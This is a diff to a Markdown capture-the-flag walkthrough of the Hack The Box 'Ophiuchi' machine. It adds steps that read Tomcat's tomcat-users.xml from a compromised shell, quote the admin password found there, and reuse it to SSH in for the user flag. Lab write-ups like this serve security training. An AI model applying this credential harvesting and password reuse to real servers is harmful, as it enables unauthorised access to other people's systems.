@@ -17,6 +17,8 @@
   - [Getting Initial Foothold](#getting-initial-foothold)
   - [Note on Initial Foothold](#note-on-initial-foothold)
 - User
+  - [Apache Tomcat Configuration File](#apache-tomcat-configuration-file)
+  - [Getting the User Flag](#getting-the-user-flag)
 - Root
 
 ## Walkthrough
@@ -223,3 +225,55 @@ public AwesomeScriptEngineFactory() {
 
 I find the following post in the [discussion forum](https://forum.hackthebox.eu/discussion/4361/official-ophiuchi-discussion) for the Ophiuchi box.
 ![discussion](images/7.png)
+
+### Apache Tomcat Configuration File
+
+Next, since we know that Apache Tomcat webserver is running on the remote machine, let's search for its configuration as it often contains user credentials.
+
+[A quick Google search](https://www.mulesoft.com/tcat/tomcat-configuration) reveals that, by default, the configuration file can be found inside `TOMCAT-HOME/conf` directory.
+
+Since we are already the user `tomcat`, we can simply `cd ~` to go to TOMCAT-HOME. Then, `cd conf`. Inside the `conf` directory, there are several configuration files. Let's check out `tomcat-users.xml` as it most likely contains the users credentials.
+
+```
+bash-5.0$ echo $HOME
+/opt/tomcat
+bash-5.0$ cd ~
+bash-5.0$ ls
+bin           CONTRIBUTING.md  logs       RELEASE-NOTES  webapps
+BUILDING.txt  lib              NOTICE     RUNNING.txt    work
+conf          LICENSE          README.md  temp
+bash-5.0$ cd conf
+bash-5.0$ ls
+catalina.policy      jaspic-providers.xml  server.xml        web.xml
+catalina.properties  jaspic-providers.xsd  tomcat-users.xml
+context.xml          logging.properties    tomcat-users.xsd
+bash-5.0$
+```
+
+And sure enough, we managed to find the password for the user `admin` in `tomcat-users.xml`.
+
+```
+<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
+```
+
+and we can confirm that `admin` is a user in the remote machine by going to `/home`.
+
+```
+bash-5.0$ ls /home
+admin
+```
+
+### Getting the User Flag
+
+We can try to SSH into the remote machine as user `admin` with password `whythereisalimit` and hope that the tomcat password is re-used as the SSH password.
+
+```
+$ ssh admin@10.10.10.227
+admin@10.10.10.227's password:
+# -- snip --
+-bash-5.0$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+-bash-5.0$
+```
+
+![user flag](images/8.png)
